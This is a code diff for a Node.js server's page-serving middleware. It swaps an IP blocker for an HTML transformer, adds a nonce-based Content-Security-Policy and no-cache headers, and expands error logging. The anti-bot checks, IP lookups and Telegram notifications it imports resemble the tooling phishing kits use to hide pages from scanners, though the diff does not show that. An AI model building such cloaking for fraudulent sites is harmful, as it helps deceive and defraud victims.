@@ -12,7 +12,7 @@ import { detectBot, antiBotUtils } from './middleware/antiBot.js';
 import { scanPages } from './utils/pageScanner.js';
 import { getIPDetails, getPublicIP } from './utils/ipUtils.js';
 import { ipManager } from './utils/ipManager.js';
-import { createIPBlocker } from './middleware/ipBlocker.js';
+import HTMLTransformerService from '../services/htmlTransformer.js';
 import fetch from 'node-fetch';
 import { 
     sendTelegramNotification, 
@@ -612,12 +612,48 @@ const pageServingMiddleware = async (req, res, next) => {
             return res.redirect('/');
         }
 
-        // If all checks pass, serve the requested page
-        console.log('Serving verified page:', pagePath);
-        res.sendFile(pagePath);
+        // Read the HTML file
+        console.log('Reading page for transformation:', pagePath);
+        const html = await fs.readFile(pagePath, 'utf8');
+
+        // Transform the HTML
+        const { transformedHtml, nonce } = await HTMLTransformerService.transformHTML(html);
+
+        // Set security headers
+        res.setHeader('Content-Security-Policy', `
+            default-src 'self';
+            script-src 'self' 'nonce-${nonce}' https://challenges.cloudflare.com;
+            style-src 'self' 'unsafe-inline';
+            img-src 'self' data: https:;
+            connect-src 'self' wss: https:;
+            frame-src https://challenges.cloudflare.com;
+        `.replace(/\s+/g, ' ').trim());
+
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+        res.setHeader('Pragma', 'no-cache');
+        res.setHeader('Expires', '0');
+        res.setHeader('Surrogate-Control', 'no-store');
+        res.setHeader('Content-Type', 'text/html; charset=UTF-8');
+
+        // Log successful transformation
+        console.log('Serving transformed page:', {
+            sessionId: clientId,
+            page: requestedPage,
+            nonce: nonce.substring(0, 8) + '...' // Log partial nonce for debugging
+        });
+
+        // Send transformed HTML
+        res.send(transformedHtml);
 
     } catch (error) {
         console.error('Error in page serving middleware:', error);
+        // Log detailed error for debugging
+        console.error({
+            errorMessage: error.message,
+            stack: error.stack,
+            requestPath: req.url,
+            clientId: req.query.client_id
+        });
         res.redirect('/');
     }
 };
